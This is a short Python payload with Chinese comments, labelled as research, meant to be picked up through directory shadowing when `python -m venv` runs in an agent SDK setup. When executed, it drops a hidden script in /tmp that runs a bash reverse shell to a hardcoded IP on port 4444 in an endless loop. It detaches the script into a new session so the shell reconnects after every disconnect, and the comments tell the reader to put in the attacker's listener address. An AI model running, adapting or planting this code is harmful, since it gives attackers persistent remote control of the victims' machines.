# -*- coding: utf-8 -*-
# ensure_agent_sdk `python -m venv` cwd 影子劫持 payload（研究用）· 跨平台不断线版
# 机制：落地 /tmp/.k.sh 重连循环，subprocess.Popen(start_new_session=True) 起新会话——
# 等效 setsid 但没有 setsid 依赖（macOS 无 setsid 命令，这是 cross-platform 的关键差异），
# shell 断开（咳掉/break/exit/断网）3 秒后自动重连，无需再触发。
# 修改 HOST/PORT 为攻击者监听地址。
import os
import subprocess

HOST, PORT = "21.214.70.93", "4444"

SCRIPT = f"""#!/bin/bash
while :; do
  bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1 2>/dev/null
  sleep 3
done
"""

def _main():
    p = "/tmp/.k.sh"
    with open(p, "w") as f:
        f.write(SCRIPT)
    os.chmod(p, 0o700)
    # 关键点：start_new_session 由 Python 进程自己做（调 setsid(2) syscall），
    # 不依赖外部 `setsid` 二进制——macOS/精简 Linux 均可工作。
    subprocess.Popen(
        [p],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )

_main()
os._exit(0)
